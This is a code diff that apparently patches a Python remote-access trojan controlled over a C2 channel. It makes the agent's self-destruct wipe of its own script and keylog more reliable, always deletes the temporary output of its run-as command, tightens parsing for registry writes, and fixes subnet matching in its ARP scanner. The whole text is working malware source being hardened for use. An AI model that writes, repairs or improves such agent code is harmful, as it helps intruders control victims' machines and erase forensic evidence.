@@ -1215,7 +1215,8 @@ def _self_destruct(conn, args: list[str]) -> str:
     except OSError as e:
         messages.append(f"[-] Keylog removal: {e}")
 
-    # 3. Overwrite and delete the agent script
+    # 3. Overwrite and delete the agent script synchronously so the wipe
+    #    is guaranteed to complete before os._exit() is called.
     agent_path = os.path.abspath(sys.argv[0]) if sys.argv else None
     if agent_path and os.path.isfile(agent_path):
         try:
@@ -1229,12 +1230,15 @@ def _self_destruct(conn, args: list[str]) -> str:
 
     messages.append("[*] Self-destruct complete — terminating.")
 
-    # Schedule exit in a separate thread so the response can be sent first
+    # Schedule exit in a separate non-daemon thread so the C2 channel can
+    # flush the response before the process is killed.  Using a non-daemon
+    # thread ensures the wipe above is not interrupted mid-write if the
+    # main thread exits first.
     def _exit():
         time.sleep(1)
         os._exit(0)
 
-    threading.Thread(target=_exit, daemon=True).start()
+    threading.Thread(target=_exit, daemon=False).start()
     return "\n".join(messages)
 
 
@@ -4211,12 +4215,18 @@ def _run_as(conn, args: list[str]) -> str:
             ctypes.windll.kernel32.CloseHandle(pi.hThread)
 
             try:
-                with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
-                    output = fh.read()
-                os.remove(out_path)
-                return output.strip() or "(no output)"
-            except OSError:
-                return "[+] Process finished (no output captured)"
+                try:
+                    with open(out_path, "r", encoding="utf-8", errors="replace") as fh:
+                        output = fh.read()
+                    return output.strip() or "(no output)"
+                except OSError:
+                    return "[+] Process finished (no output captured)"
+            finally:
+                # Always remove the temp file — even if reading fails
+                try:
+                    os.remove(out_path)
+                except OSError:
+                    pass
 
         except Exception as e:
             return f"[-] run_as: {e}"
@@ -4392,11 +4402,16 @@ def _reg(conn, args: list[str]) -> str:
             if reg_type is None:
                 return f"[-] Unknown REG type: {type_str}.  Valid: {', '.join(TYPE_MAP)}"
 
-            # Coerce data to the correct Python type
+            # Coerce data to the correct Python type.
+            # Use base 16 when the value starts with "0x"/"0X", otherwise
+            # use strict base 10 — prevents silent octal interpretation of
+            # values like "010" (which int("010", 0) would parse as 8).
             if reg_type == winreg.REG_DWORD:
-                data: object = int(raw_data, 0)
+                _rstrip = raw_data.strip()
+                data: object = int(_rstrip, 16) if _rstrip.lower().startswith("0x") else int(_rstrip, 10)
             elif reg_type == winreg.REG_QWORD:
-                data = int(raw_data, 0)
+                _rstrip = raw_data.strip()
+                data = int(_rstrip, 16) if _rstrip.lower().startswith("0x") else int(_rstrip, 10)
             elif reg_type == winreg.REG_BINARY:
                 data = bytes.fromhex(raw_data.replace(" ", ""))
             elif reg_type == winreg.REG_MULTI_SZ:
@@ -4594,11 +4609,15 @@ def _arp_scan(conn, args: list[str]) -> str:
         with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
             list(ex.map(_ping, hosts))
         arp_out = _shell_exec("arp -a 2>&1")
-        # Filter to only IPs in our target subnet
+        # Filter to only IPs in our target subnet.
+        # Use word-boundary matching so 192.168.1.1 does not match
+        # 192.168.1.10 or 192.168.1.100 (H3 fix).
+        import re as _re
         lines = [f"[*] ARP cache entries for {cidr}:"]
+        host_set = {str(ip) for ip in hosts}
         for line in arp_out.splitlines():
-            for ip in hosts:
-                if str(ip) in line:
+            for token in _re.split(r"[\s,]+", line):
+                if token in host_set:
                     lines.append(f"  {line.strip()}")
                     break
         return "\n".join(lines) if len(lines) > 1 else f"[-] No ARP entries found for {cidr}"
